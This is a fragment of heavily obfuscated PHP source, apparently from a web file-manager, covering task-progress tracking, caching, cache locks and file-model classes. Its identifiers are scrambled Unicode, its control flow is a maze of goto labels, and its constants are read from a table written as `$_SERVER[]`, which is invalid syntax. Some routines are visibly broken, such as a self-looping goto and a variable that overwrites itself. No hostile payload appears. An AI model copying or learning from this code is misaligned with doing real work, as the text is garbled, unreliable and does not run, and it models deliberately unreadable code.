$this->task = !1; goto Aő; cפ: $EӃ = timeFloat() - $this->task[$Eⷘ[755]]; self::log($Eⷘ[1544] . $this->task[$Eⷘ[393]] . $Eⷘ[1545] . $EӃ . $Eⷘ[1546]); Hook::unbind($Eⷘ[1499], array($this, $Eⷘ[1540])); goto f; Eᦙ٘: $Eⷘ =& $_SERVER[]; if (!$this->task) { return; } if ($this->task[$Eⷘ[1536]]) { self::valueSet($this->task[$Eⷘ[393]], !1); } goto cפ; Aő: } public function update($F윜ш = 0, $b = false) { goto B㌑; B㌑: $a뺃 =& $_SERVER[]; $E˦Ј =& $this->task; if (!$E˦Ј) { return; } goto d; d: $E˦Ј[$a뺃[1043]] += $F윜ш; $E˦Ј[$a뺃[754]] = timeFloat(); if ($E˦Ј[$a뺃[1028]]) { if ($E˦Ј[$a뺃[1028]] < $E˦Ј[$a뺃[1043]]) { $E˦Ј[$a뺃[1028]] = $E˦Ј[$a뺃[1043]]; } $Eח = timeFloat() - $E˦Ј[$a뺃[755]] - $E˦Ј[$a뺃[1537]]; $E˦Ј[$a뺃[1534]] = $E˦Ј[$a뺃[1043]] / $E˦Ј[$a뺃[1028]]; $E˦Ј[$a뺃[1535]] = $E˦Ј[$a뺃[1043]] / $Eח; if ($E˦Ј[$a뺃[1534]] > 0) { $E˦Ј[$a뺃[1538]] = $Eח * (1 - $E˦Ј[$a뺃[1534]]) / $E˦Ј[$a뺃[1534]]; } $E˦Ј[$a뺃[1538]] = $E˦Ј[$a뺃[1538]] <= 0 ? 0 : $E˦Ј[$a뺃[1538]]; } goto EݧǄ; EݧǄ: $this->updateAfter(); $f = 0.2; if (timeFloat() - $E˦Ј[$a뺃[1536]] < $f && !$b) { return; } goto c; c: $E鴄 = self::get($E˦Ј[$a뺃[393]]); $aɑ = $E鴄[$a뺃[716]]; if ($aɑ == self::STATYS_KILL) { $BĒ = array($a뺃[1547] => LNG($a뺃[1548]), $a뺃[1093] => !1); Cache::set($a뺃[1549] . $this->task[$a뺃[393]], $BĒ, 30); $this->onKill(); $this->end(); die; } else { if ($aɑ == self::STATYS_STOP) { $Dꛪ = 2; $E鴄[$a뺃[1537]] += $Dꛪ; self::valueSet($E˦Ј[$a뺃[393]], $E鴄); sleep($Dꛪ); $this->update(); return; } } goto Cﮍ; Cﮍ: $E˦Ј[$a뺃[716]] = $aɑ ? $aɑ : $E˦Ј[$a뺃[716]]; $E˦Ј[$a뺃[1537]] = $E鴄[$a뺃[1537]] ? $E鴄[$a뺃[1537]] : 0; $E˦Ј[$a뺃[1536]] = timeFloat(); goto C垔; C垔: Hook::trigger($a뺃[1550], $E˦Ј); self::valueSet($E˦Ј[$a뺃[393]], $E˦Ј); goto fľ; fľ: } public function onKillSet($d, $Cجׇ = array()) { $this->onKillCall = array($d, $Cجׇ); } public function onKill() { $e⧇ =& $_SERVER[]; self::log($e⧇[1544] . $this->task[$e⧇[393]] . $e⧇[1551]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($fۄ) { $CЫ =& $_SERVER[]; Cache::set($CЫ[1549] . $this->task[$CЫ[393]], $fۄ, 60); return $fۄ; } public static function get($a) { $Bƨ =& $_SERVER[]; $d׵ = self::valueGet($a); if (is_array($d׵) && $d׵[$Bƨ[1552]]) { $d = ActionApply($d׵[$Bƨ[1552]], array($d׵)); $d׵ = is_array($d) ? $d : $d׵; } return $d׵; } public static function listData() { $b񃷗ɚ = self::valueGet(); return array_sort_by($b񃷗ɚ, $_SERVER[][755], !0); } public static function kill($cʯϋ) { return self::changeStatus($cʯϋ, self::STATYS_KILL); } public static function stop($E) { return self::changeStatus($E, self::STATYS_STOP); } public static function restart($eҊ) { return self::changeStatus($eҊ, self::STATYS_RUNNING); } public static function killAll() { $Fҫ =& $_SERVER[]; $B؏ = self::listData(); foreach ($B؏ as $B𣄕) { self::kill($B𣄕[$Fҫ[393]]); } sleep(2); foreach ($B؏ as $B𣄕) { self::valueSet($B𣄕[$Fҫ[393]], !1); } } private static function changeStatus($Eԏ, $Bŝ) { goto bթՖ; bթՖ: $CΛν =& $_SERVER[]; $DՂٸ = self::valueGet($Eԏ); if (!$DՂٸ) { return !1; } goto b; C鬏: return !0; goto C; b: $DՂٸ[$CΛν[716]] = $Bŝ; self::valueSet($Eԏ, $DՂٸ); self::log($CΛν[1553] . $DՂٸ[$CΛν[393]] . $CΛν[1554] . $Bŝ); goto C鬏; C: } public static function valueGet($Fٸ = false) { $eѭ =& $_SERVER[]; if ($Fٸ) { $CƱ = Model($eѭ[425])->where(array($eѭ[93] => $Fٸ, $eѭ[29] => $eѭ[1555]))->find(); return $CƱ ? json_decode($CƱ[$eѭ[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($dȎÛ = false) { goto F; C݆: $d褵 = Model($c[425])->where($aޣ)->select(); $d褵 = $d褵 ? $d褵 : array(); foreach ($d褵 as $e߃ => $dу) { $d褵[$e߃] = json_decode($dу[$c[372]], !0); } goto e; F: $c =& $_SERVER[]; $aޣ = array($c[29] => $c[1555]); if ($dȎÛ) { $aޣ[$c[1533]] = $dȎÛ; } goto C݆; e: return $d褵; goto F̽; F̽: } public static function valueSet($b, $fǴȳ) { goto fѧ; b: Model($eܱ[425])->add($aϗ, array(), !0); goto bק; DХ: if (!$cۑ) { ob_start(); var_dump($fǴȳ); $dɐܣ = ob_get_clean(); self::log($eܱ[1556] . json_encode_force($dɐܣ)); } if (!$b || !$fǴȳ[$eܱ[393]]) { return !1; } $aϗ = array($eܱ[29] => $eܱ[1555], $eܱ[1533] => USER_ID, $eܱ[93] => $b, $eܱ[372] => $cۑ); goto b; fѧ: $eܱ =& $_SERVER[]; if (!$fǴȳ) { return Model($eܱ[425])->where(array($eܱ[93] => $b, $eܱ[29] => $eܱ[1555]))->delete(); } $cۑ = json_encode($fǴȳ); goto DХ; bק: } public static function log($Fؿ) { if (!GLOBAL_DEBUG) { return; } write_log($Fؿ, $_SERVER[][1557]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto c; A߉: Hook::bind($aķϔ[1567], array($this, $aķϔ[1568])); Hook::bind($aķϔ[559], array($this, $aķϔ[1569])); $this->sourceModelCopyFlag = !1; goto dՔ; c: $aķϔ =& $_SERVER[]; $E =& $this->task; $this->sourceCopyFolder = !1; goto a; d̑: $E[$aķϔ[1576]] = LNG($aķϔ[1577]); $E[$aķϔ[1578]] = 0; $E[$aķϔ[1579]] = 0; goto C; a: Hook::bind($aķϔ[1558], array($this, $aķϔ[1559])); Hook::bind($aķϔ[1117], array($this, $aķϔ[1560])); Hook::bind($aķϔ[1561], array($this, $aķϔ[1562])); goto aӃ; FߕŃ: $E[$aķϔ[1582]] = 0; $E[$aķϔ[1583]] = 0; if (!$E[$aķϔ[1439]]) { $E[$aķϔ[1439]] = LNG($aķϔ[1584]); } goto Aѝ; f⶿: Hook::bind($aķϔ[539], array($this, $aķϔ[1566])); Hook::bind($aķϔ[541], array($this, $aķϔ[1566])); Hook::bind($aķϔ[543], array($this, $aķϔ[1566])); goto A߉; aӃ: Hook::bind($aķϔ[566], array($this, $aķϔ[1563])); Hook::bind($aķϔ[567], array($this, $aķϔ[1564])); Hook::bind($aķϔ[569], array($this, $aķϔ[1565])); goto Dʬ; C: $E[$aķϔ[1030]] = $aķϔ[33]; $E[$aķϔ[1580]] = $aķϔ[33]; $E[$aķϔ[1581]] = 0; goto FߕŃ; dՔ: Hook::bind($aķϔ[1570], array($this, $aķϔ[1571])); Hook::bind($aķϔ[1572], array($this, $aķϔ[1573])); Hook::bind($aķϔ[1574], array($this, $aķϔ[1575])); goto d̑; Dʬ: Hook::bind($aķϔ[570], array($this, $aķϔ[1565])); Hook::bind($aķϔ[537], array($this, $aķϔ[1566])); Hook::bind($aķϔ[534], array($this, $aķϔ[1566])); goto f⶿; Aѝ: } protected function endAfter() { goto E; f֏׬: Hook::unbind($fىύ[1561], array($this, $fىύ[1562])); Hook::unbind($fىύ[566], array($this, $fىύ[1563])); Hook::unbind($fىύ[567], array($this, $fىύ[1564])); goto B; Eє: Hook::unbind($fىύ[534], array($this, $fىύ[1566])); Hook::unbind($fىύ[539], array($this, $fىύ[1566])); Hook::unbind($fىύ[541], array($this, $fىύ[1566])); goto b׈; E: $fىύ =& $_SERVER[]; Hook::unbind($fىύ[1558], array($this, $fىύ[1559])); Hook::unbind($fىύ[1117], array($this, $fىύ[1560])); goto f֏׬; Dެ: Hook::unbind($fىύ[1570], array($this, $fىύ[1571])); Hook::unbind($fىύ[1572], array($this, $fىύ[1573])); Hook::unbind($fىύ[1574], array($this, $fىύ[1575])); goto C竒ċ; B: Hook::unbind($fىύ[569], array($this, $fىύ[1565])); Hook::unbind($fىύ[570], array($this, $fىύ[1565])); Hook::unbind($fىύ[537], array($this, $fىύ[1566])); goto Eє; b׈: Hook::unbind($fىύ[543], array($this, $fىύ[1566])); Hook::unbind($fىύ[1567], array($this, $fىύ[1568])); Hook::unbind($fىύ[559], array($this, $fىύ[1569])); goto Dެ; C竒ċ: } public function copyMoveStart($E, $A°, $aްʽ, $Eߩ) { goto e; d܉Ǉ: if (substr($A°, 0, strlen($Cಅ)) == $Cಅ) { return; } if (substr($Eߩ, 0, strlen($Cಅ)) == $Cಅ) { return; } $D =& $this->task; goto F; e: $A눻 =& $_SERVER[]; self::log($A눻[1585] . $A° . $A눻[67] . $Eߩ); $Cಅ = rtrim(TEMP_FILES, $A눻[8]); goto d܉Ǉ; F: $D[$A눻[1586]] = KodIO::transferType($E, $aްʽ); $this->update(); goto F; F: } public function updateAfter() { $f۱哕 =& $_SERVER[]; $c楉 =& $this->task; if (!$c楉[$f۱哕[729]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($c楉[$f۱哕[1586]] == $f۱哕[1190]) { return; } self::updateTask($c楉); } private static function updateTask(&$B뽻) { $aǝ =& $_SERVER[]; if ($B뽻[$aǝ[1586]] == $aǝ[1101] || $B뽻[$aǝ[1586]] == $aǝ[107]) { if ($B뽻[$aǝ[1580]]) { $B뽻[$aǝ[1583]] = $B뽻[$aǝ[1582]] + $B뽻[$aǝ[1579]]; } } else { if ($B뽻[$aǝ[1586]] == $aǝ[1191]) { if ($B뽻[$aǝ[1580]] == $aǝ[1101]) { $B뽻[$aǝ[1583]] = $B뽻[$aǝ[1582]] + $B뽻[$aǝ[1579]] * 0.5; } else { if ($B뽻[$aǝ[1580]] == $aǝ[107]) { $B뽻[$aǝ[1583]] = $B뽻[$aǝ[1582]] + $B뽻[$aǝ[1578]] * 0.5 + $B뽻[$aǝ[1579]] * 0.5; } } } } $B뽻[$aǝ[1534]] = $B뽻[$aǝ[1583]] / $B뽻[$aǝ[729]]; if ($B뽻[$aǝ[1534]] > 0) { $Cߠ = timeFloat() - $B뽻[$aǝ[755]] - $B뽻[$aǝ[1537]]; $B뽻[$aǝ[1538]] = $Cߠ * (1 - $B뽻[$aǝ[1534]]) / $B뽻[$aǝ[1534]]; } } public function addPath($A̝) { goto Cۨ܃; Dճ: $f膤 = IO::infoWithChildren($A̝); $dױǯ = $bʗ[$e[1587]] ? $bʗ[$e[1587]][$e[1588]] : 0; $bʗ[$e[1587]] = array($e[1588] => $dױǯ + 1, $e[413] => $f膤[$e[28]], $e[76] => $f膤[$e[76]], $e[495] => $f膤[$e[495]] ? $f膤[$e[495]] : $f膤[$e[76]]); goto Bψ; Cۨ܃: $e =& $_SERVER[]; if (!$A̝) { return; } $bʗ =& $this->task; goto Dճ; Bψ: if ($f膤[$e[29]] == $e[193]) { $bʗ[$e[1028]] += 1; } else { $bʗ[$e[1028]] += $f膤[$e[81]][$e[79]]; if ($f膤[$e[395]]) { $bʗ[$e[1028]] += $f膤[$e[81]][$e[80]] + 1; } } $bʗ[$e[729]] += $f膤[$e[78]]; $this->update(); goto b茆֗; b茆֗: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($eٴ) { $A錽 =& $_SERVER[]; $e̮ =& $this->task; $e̮[$A錽[1576]] = $eٴ[$A錽[28]]; $e̮[$A錽[1030]] = $eٴ[$A錽[28]]; $this->update(); } public function copyFileStart($c귇, $C㔣, $c󑘣, $BӋ, $bꭰ, $a) { goto f; cϢΑ: $Aي̡ӗ = $c[$bȬꆅ[1578]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($c[$bȬꆅ[393]] . $bȬꆅ[1591]); if ($Aي̡ӗ && file_exists(get_path_father($BӋ))) { Cache::set($c[$bȬꆅ[393]] . $bȬꆅ[1591], $BӋ); $c[$bȬꆅ[1552]] = array($bȬꆅ[1592], $bȬꆅ[1593]); } goto aȻ; f: $bȬꆅ =& $_SERVER[]; $aݼՇ = $bꭰ; if ($aݼՇ == $GLOBALS[$bȬꆅ[1589]]) { $aݼՇ = $GLOBALS[$bȬꆅ[1590]]; } goto E֚; aȻ: $this->update(0, $Aي̡ӗ); goto A嚵; fڽ: $c[$bȬꆅ[1030]] = $bȬꆅ[33]; $c[$bȬꆅ[1580]] = $bȬꆅ[33]; $c[$bȬꆅ[1581]] = 0; goto cϢΑ; E֚: $GLOBALS[$bȬꆅ[1590]] = $bꭰ; $GLOBALS[$bȬꆅ[1589]] = $a; $c =& $this->task; goto C; C: $c[$bȬꆅ[1576]] = $aݼՇ; $c[$bȬꆅ[1578]] = (int) $c귇->size($C㔣); $c[$bȬꆅ[1579]] = 0; goto fڽ; A嚵: } public static function updateCopyLocalFileSize($Bλʋ) { goto bȘڷ; dƃ: $Bλʋ[$E𒲷ӕ[1579]] = @filesize($e·); $Bλʋ[$E𒲷ӕ[1583]] += $Bλʋ[$E𒲷ӕ[1579]]; self::updateTask($Bλʋ); goto e뒇; bȘڷ: $E𒲷ӕ =& $_SERVER[]; $e· = Cache::get($Bλʋ[$E𒲷ӕ[393]] . $E𒲷ӕ[1591]); if (!$e· || !file_exists($e·)) { return $Bλʋ; } goto dƃ; e뒇: return $Bλʋ; goto f٨; f٨: } public function copyFileEnd($Cۣ, $F۩ķ, $F, $B֙, $C̡, $Fʴͫ) { goto Eȍ; Eȍ: $aⱎ =& $_SERVER[]; $aߍ =& $this->task; $aߍ[$aⱎ[1579]] = $aߍ[$aⱎ[1578]]; goto E; e: Cache::remove($aߍ[$aⱎ[393]] . $aⱎ[1591]); self::log($aⱎ[1594] . $F۩ķ . $aⱎ[67] . $B֙ . $aⱎ[229] . $C̡ . $aⱎ[1595] . $aߍ[$aⱎ[1576]]); goto Cۨ; E: $aߍ[$aⱎ[1580]] = $aⱎ[33]; unset($aߍ[$aⱎ[1552]]); if ($C̡ == $aߍ[$aⱎ[1576]]) { $aߍ[$aⱎ[1582]] += $aߍ[$aⱎ[1578]]; $aߍ[$aⱎ[1583]] = $aߍ[$aⱎ[1582]]; $this->update(1); } else { $this->update(); $aߍ[$aⱎ[1579]] = 0; } goto e; Cۨ: } public function updateFileEnd($B, $Eԍ) { goto fҝ; a͡: $this->update(1); self::log($E[1596] . $B); goto FɐƉ; c銞: $a޺[$E[1578]] = $Eԍ; $a޺[$E[1582]] += $Eԍ; $a޺[$E[1583]] = $a޺[$E[1582]]; goto a͡; fҝ: $E =& $_SERVER[]; $a޺ =& $this->task; $a޺[$E[1576]] = $B; goto c銞; FɐƉ: } public function sourceModelCopy($A޼) { goto A; A: $e񵈨 =& $_SERVER[]; $Dѵ = $A޼[0]; $fԟ = $A޼[1]; goto DПŗ; Dɮ: switch ($Dѵ) { case $e񵈨[535]: $f = 1; break; case $e񵈨[538]: $F[$e񵈨[1576]] = $fԟ[$e񵈨[28]]; break; case $e񵈨[540]: $f = intval($A޼[$e񵈨[377]] * 0.4); break; case $e񵈨[542]: $f = intval($A޼[$e񵈨[377]] * 0.2); break; case $e񵈨[544]: $f = intval($A޼[$e񵈨[377]] * 0.4); break; } $this->update($f); $this->sourceModelCopyFlag = !1; goto e; DПŗ: $F =& $this->task; $this->sourceModelCopyFlag = !0; $f = 0; goto Dɮ; e: } public function sourceRemove($cʊҝ, $eѪ) { $DȐ =& $_SERVER[]; $this->sourceModelCopyFlag = !0; $FΓ = 1; if (isset($cʊҝ[$DȐ[81]])) { $FΓ = $cʊҝ[$DȐ[81]][$DȐ[79]] + $cʊҝ[$DȐ[81]][$DȐ[80]] + 1; } $this->update($FΓ); $this->sourceModelCopyFlag = !1; } public function sourceMove($d) { $this->sourceRemove($d, !1); } public function curlProgress($B߃, $f, $d˚, $fճ, $F歵) { $d˅ =& $_SERVER[]; $F =& $this->task; if ($F歵 > 0) { $F[$d˅[1030]] = $d˅[1597]; $F[$d˅[1580]] = $d˅[107]; if ($F[$d˅[1578]]) { $F[$d˅[1579]] = $F歵; } if ($F[$d˅[1581]]) { $F[$d˅[1579]] = $F歵 + $F[$d˅[1581]]; } } else { if ($d˚ > 0) { if ($F[$d˅[1578]] == $f) { $F[$d˅[1579]] = $d˚; $F[$d˅[1030]] = $d˅[1598]; $F[$d˅[1580]] = $d˅[1101]; } } } $this->update(); } public function curlProgressStart($f) { } public function curlProgressEnd($a˅͢) { goto Cވ; Dő: $this->update(); goto dü; Cވ: $b =& $_SERVER[]; $d =& $this->task; $E̬ = curl_getinfo($a˅͢); goto Cң; Cң: $a̤߭ = $E̬[$b[1599]]; if ($a̤߭ == -1) { $a̤߭ = $E̬[$b[1600]]; } if ($d[$b[1580]] == $b[107] && $a̤߭) { $d[$b[1581]] += $a̤߭; } goto Dő; dü: } } goto D綇; DڱȐ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto c; c: $Eؽވ =& $_SERVER[]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto fԽ; fԽ: $AȚϏ = $GLOBALS[$Eؽވ[6]][$Eؽވ[347]]; $Fސ = $AȚϏ[$AȚϏ[$Eؽވ[798]]]; $A迂ƍ = $AȚϏ[$Eؽވ[799]]; goto C; C: switch ($AȚϏ[$Eؽވ[798]]) { case $Eؽވ[17]: self::$handle = Model($Eؽވ[800]); break; case $Eؽވ[801]: self::$handle = new CacheRedis($Fސ, $A迂ƍ); break; case $Eؽވ[802]: self::$handle = new CacheMemcached($Fސ, $A迂ƍ); break; case $Eؽވ[193]: self::$handle = new CacheFile($Fސ, $A迂ƍ); break; default: break; } return self::$handle; goto c枊ڊ; c枊ڊ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Eʔ) { if (is_array($Eʔ) || is_object($Eʔ)) { $Eʔ = json_encode($Eʔ); } $Eʔ = rawurlencode($Eʔ); return md5(KOD_SITE_ID . $_SERVER[][71] . $Eʔ); } public static function get($a, $b̬Ю҇ = false) { $bņˌ = self::key($a); if ($b̬Ю҇) { return unserialize(self::init()->get($bņˌ)); } if (!isset(self::$memoryCache[$bņˌ])) { $A̝ = self::init()->get($bņˌ); self::$memoryCache[$bņˌ] = unserialize($A̝); } return self::$memoryCache[$bņˌ]; } public static function set($eÏ, $F뱐, $d羣 = false) { goto aӡ; C΍: CacheLock::unlock($eÏ); return $d; goto A; aۃԥ: CacheLock::lock($eÏ); $d = self::init()->set($c, serialize($F뱐), $d羣); self::$memoryCache[$c] = $F뱐; goto C΍; aӡ: $c = self::key($eÏ); if (isset(self::$memoryCache[$c]) && self::$memoryCache[$c] === $F뱐) { return !0; } if ($d羣 === 0) { self::$memoryCache[$c] = $F뱐; return !0; } goto aۃԥ; A: } public static function getCall($b֝, $aǊ, $b궲ė, $Eڮ͖ = array()) { goto Fɠ; Fɠ: $dໆ =& $_SERVER[]; $Cꄗ = self::get($b֝); if ($Cꄗ || $Cꄗ === $dໆ[33]) { return $Cꄗ; } goto Fм; Fм: $Cꄗ = call_user_func_array($b궲ė, $Eڮ͖); $Cꄗ = $Cꄗ ? $Cꄗ : $dໆ[33]; self::set($b֝, $Cꄗ, $aǊ); goto aړȔ; aړȔ: return $Cꄗ; goto aۑ; aۑ: } public static function remove($f) { goto dϮ겲; FҺ: CacheLock::lock($f); $B݆ = self::init()->remove($Fߪ); CacheLock::unlock($f); goto Fҹ; Fҹ: return $B݆; goto AÈ; dϮ겲: $Fߪ = self::key($f); unset(self::$memoryCache[$Fߪ]); self::clearTimeout(); goto FҺ; AÈ: } public static function removeMemory($dŐڶġ) { $b = self::key($dŐڶġ); unset(self::$memoryCache[$b]); } public static function clearMemory($F = false) { if ($F) { $F = self::key($F); unset(self::$memoryCache[$F]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[][803])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[][804])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($fφĴ, $E) { $dȑ =& $_SERVER[]; $this->cachePath = $fφĴ[$dȑ[76]]; $this->prefix = $dȑ[805]; $this->cacheTime = $E; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($eݗσе) { $c칉֡ =& $_SERVER[]; $eݗσе = str_replace(array($c칉֡[806], $c칉֡[97], $c칉֡[70]), $c칉֡[807], $eݗσе); return $this->cachePath . $c칉֡[808] . $eݗσе . $c칉֡[809]; } public function set($Fԭ, $Aȹ, $A؈ = false) { $B = $this->getFile($Fԭ); if (file_put_contents($B, $this->prefix . $Aȹ, LOCK_EX)) { @touch($B, intval(time() + $A؈)); clearstatcache(); return !0; } @unlink($B); return !1; } public function get($C劒) { $A = $this->getFile($C劒); if (file_exists($A) && filemtime($A) < time()) { @unlink($A); return !1; } $c = @file_get_contents($A); return substr($c, strlen($this->prefix)); } public function remove($Eʊ) { $B = $this->getFile($Eʊ); return @unlink($B); } public function deleteAll() { $a =& $_SERVER[]; $d߰ = scandir($this->cachePath); foreach ($d߰ as $Cԉ) { $cܸ = $this->cachePath . $Cԉ; if (strpos($cܸ, $a[809]) && strpos($cܸ, $a[810])) { @unlink($cܸ); } } } public function clearTimeout() { $f =& $_SERVER[]; $f = scandir($this->cachePath); foreach ($f as $eƞ) { $f = $this->cachePath . $eƞ; if (strpos($f, $f[809]) && strpos($f, $f[810]) && filemtime($f) < time()) { @unlink($f); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto c겸; c겸: $aؑؒ =& $_SERVER[]; if (self::$handle) { return self::$handle; } $F = $GLOBALS[$aؑؒ[6]][$aؑؒ[347]]; goto fъ; B𕵢̤: if ($A == $aؑؒ[17] && $c == $aؑؒ[9]) { $A = $aؑؒ[193]; } switch ($A) { case $aؑؒ[801]: self::$handle = new CacheLockRedis(); break; case $aؑؒ[802]: self::$handle = new CacheLockMemcached(); break; case $aؑؒ[17]: self::$handle = new CacheLockDatabase(); break; case $aؑؒ[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto b򫇞; fъ: self::$timeout = $F[$aؑؒ[811]] ? $F[$aؑؒ[811]] : 10; $c = _get($GLOBALS[$aؑؒ[6]], $aؑؒ[812]); $A = $F[$aؑؒ[798]] ? $F[$aؑؒ[798]] : $aؑؒ[193]; goto B𕵢̤; b򫇞: } private static function key($BޑҼ) { return $_SERVER[][813] . Cache::key($BޑҼ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($c˕ = '') { self::$errorMsg = $c˕; } public static function lockGlobal($F㪳, $A) { return self::lock($F㪳, $A, !0); } public static function lock($Dߖ, $B¾ = false, $B = false) { goto A; d: $B¾ = $B¾ ? $B¾ : self::$timeout; $c֘ = $aᄽ->lock($Fȴ݇, $B¾); if (!$c֘) { $d = "\x6c\157\143\153\x20\x65\x72\162\x6f\162\x3b\x6b\x65\x79\x3d{$Dߖ}\x3b\x74\x69\x6d\x65\75{$B¾}\73" . self::$errorMsg . $aې[68] . get_caller_msg(); $F = LNG($aې[814]) . "\x28{$B¾}\163\x29\56" . LNG($aې[815]); $F .= $aې[816]; if (is_string(self::$errorMsg) && self::$errorMsg) { $F = $F . $aې[817] . self::$errorMsg; } write_log($d, $aې[818]); show_json($F, !1); } goto bགྷ; bགྷ: if (!$B) { self::$lockItem[$Fȴ݇] = !0; } return $c֘; goto C; A: $aې =& $_SERVER[]; $aᄽ = self::init(); $Fȴ݇ = self::key($Dߖ); goto d; C: } public static function lockGet($c) { $A = self::key($c); if (self::$lockItem[$A]) { return self::$lockItem[$A]; } return self::init()->lockGet($A); } public static function unlock($Dװ) { $Eס = self::key($Dװ); self::$lockItem[$Eס] = null; return self::init()->unlock($Eס); } public static function unlockRuntime() { $FŃ =& $_SERVER[]; $Eڜݹ = self::init(); $c߉ح = !1; foreach (self::$lockItem as $aſȬ => $D󻎰) { if (!$D󻎰) { continue; } $Eڜݹ->unlock($aſȬ); if (!$c߉ح) { $c߉ح = !0; write_log($FŃ[819] . $aſȬ . $FŃ[68] . get_caller_msg(), $FŃ[818]); continue; } write_log($FŃ[819] . $aſȬ, $FŃ[818]); } self::fileUnlockAll(); } public static function fileLock($c) { goto Eބچ; C: return !1; goto A󌒫Խ; F: $B = fopen(DATA_PATH . $c . $bՏ[821], $bՏ[822]); if (!$B) { return !1; } $GLOBALS[$bՏ[820]][$c] = $B; goto D탋ב; D탋ב: if (flock($B, LOCK_EX)) { return !0; } self::unlock($c); show_json($bՏ[823], !1); goto C; Eބچ: $bՏ =& $_SERVER[]; if (!$GLOBALS[$bՏ[820]]) { $GLOBALS[$bՏ[820]] = array(); } $GLOBALS[$bՏ[820]][$c] = !1; goto F; A󌒫Խ: } public static function fileUnlock($A҂) { $bү =& $_SERVER[]; $dĳˎ = $GLOBALS[$bү[820]][$A҂]; if (!$dĳˎ) { return; } $GLOBALS[$bү[820]][$A҂] = !1; flock($dĳˎ, LOCK_UN); fclose($dĳˎ); } public static function fileUnlockAll() { $Bޤ綠 =& $_SERVER[]; if (!$GLOBALS[$Bޤ綠[820]]) { return; } foreach ($GLOBALS[$Bޤ綠[820]] as $C => $Cߖ) { if (!$Cߖ) { continue; } $GLOBALS[$Bޤ綠[820]][$C] = !1; flock($Cߖ, LOCK_UN); fclose($Cߖ); } $GLOBALS[$Bޤ綠[820]] = array(); } } goto EÞ梘; f߄ϔ: class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\154\x65\x5f\143\x6f\156\x74\x65\156\164\x73"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\124\x69\155\145", "\x74\x69\155\145", "\x69\156\163\145\x72\x74", "\146\165\x6e\143\x74\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\x6c\145"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\x61\155\x65" => "\x69\x6f\x5f\146\x69\x6c\145\x5f\x6d\x65\164\x61", "\x6d\x65\164\141\x46\151\145\x6c\x64" => "\x66\151\154\145\x49\x44"); public function fileInfo($DŘ) { $cˢ =& $_SERVER[]; static $a껲 = array(); if (!isset($a껲[$DŘ])) { $aϙ = $cˢ[1745]; $E懍 = Model($cˢ[450])->field($aϙ)->where(array($cˢ[448] => $DŘ))->find(); $a껲[$DŘ] = $E懍; } return $a껲[$DŘ]; } public function addFileByContent($a֟ = '', $A = '') { goto E; f߱̋: if (file_exists($a)) { @unlink($a); } return $fҞ; goto D򰤆; c̦: $a = $f . $Fǂ[1747] . rand_string(16); file_put_contents($a, $a֟); $fҞ = $this->addFile($a, $A, !0); goto f߱̋; E: $Fǂ =& $_SERVER[]; $f = TEMP_PATH . $Fǂ[1746]; if (!is_dir($f)) { mk_dir($f); } goto c̦; D򰤆: } public function createFileName($e݈܊ү, $C掸 = false, $Eɯ = false) { goto Fе; f۟: if (!$bШ && !Cache::get($Bե)) { $bШ = !0; $D⩛֤ = IO::mkdir($c); if (!IO::exist($D⩛֤ . $e[767])) { IO::mkfile($D⩛֤ . $e[767]); } Cache::set($Bե, 1, 3600 * 2); } return $Bм; goto f; c: $c = $d->pathFather($Bм); static $bШ = false; $Bե = $e[1748] . md5($c); goto f۟; Fе: $e =& $_SERVER[]; $d = IO::init($e[8]); $Bм = $this->makeFilePath($e݈܊ү, $d, $C掸, $Eɯ); goto c; f: } public function makeFilePath($Fق, $Eͻ, $eˍ = false, $e߯ = false) { goto C; DυҮ: if (!$Fق) { $d = $F[1751]; } switch ($d) { case $F[1752]: $c = $c . $F[95] . $Eͻ->ext($Fق); if ($b == $F[1691]) { $c .= $F[1435]; } break; case $F[1753]: goto cӒǩ; cӒǩ: $A筂б = Model($F[736])->get($F[737]); $aŬ = substr(md5($F[738] . $A筂б . date($F[714])), 0, 8); $F򉔷 = KodIO::defaultDriver(); goto cʼ; cߠѠ: CacheLock::lock($F֨); $c = $B . $Fق; if (IO::exist($B . $Fق)) { $BԆ = substr($Fق, 0, strlen($Fق) - strlen($b)); $d肤Ϩ = $e߯ ? substr($e߯, 0, 5) : ($eˍ ? substr($eˍ, 0, 5) : rand_string(5)); $c = $B . $BԆ . $d肤Ϩ . $F[95] . $b; } goto c滉; c滉: if (IO::isTypeObject($c) && !IO::isUploadServer($c)) { if (IO::exist($c)) { return $c; } $Cۣͩ = IO::setContent($c, $F[33]); if (!$Cۣͩ) { show_json($F[1756], !1); } } CacheLock::unlock($F֨); break; goto F; cʼ: $B = $F[1131] . $F򉔷[$F[393]] . $F[402] . date($F[1754]) . $aŬ . $F[8]; if ($b == $F[1691]) { $Fق .= $F[1435]; } $F֨ = $F[1755] . $B . $Fق; goto cߠѠ; F: case $F[1751]: break; default: break; } return $c; goto DĔ; C: $F =& $_SERVER[]; $d = Model($F[736])->get($F[1749]); $B = KodIO::defaultIO() . date($F[1750]); goto c܉; 